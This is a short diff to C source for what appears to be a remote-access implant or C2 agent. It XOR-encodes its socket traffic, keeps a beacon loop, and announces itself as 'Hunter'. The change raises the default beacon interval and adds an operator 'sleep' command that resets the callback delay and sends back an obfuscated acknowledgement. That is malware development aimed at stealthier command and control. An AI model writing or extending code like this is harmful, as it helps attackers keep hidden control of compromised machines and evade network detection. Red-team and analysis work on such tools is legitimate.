@@ -18,7 +18,7 @@ char* key = KEY;
 char buf[MAXBUF];
 int bufsize;
 int beaconing;
-int sleeptime = 5000;
+int sleeptime = 20000;
 
 int main(void) {
 
@@ -101,7 +101,14 @@ int main(void) {
 				memset(command, '\0', strlen(command));
 
 			}
-			
+			else if(str_starts_with(xorbuf, "sleep") == 0){
+				char* cmd = split(xorbuf, " ");
+				sleeptime = (atoi(cmd))*1000;
+				char* sleepmsg = "\e[1;32m[+]\e[0m Hunter: OK\n";
+                                char* xorsleepmsg = XOR(sleepmsg, key, strlen(sleepmsg), keylen);
+				send(sock, xorsleepmsg, strlen(sleepmsg), 0);
+				free(xorsleepmsg);
+			}
 			else if(strncmp(xorbuf, "\n", 1) == 0)
 			{
 				char* xornewline = XOR("\n", key, 1, keylen);
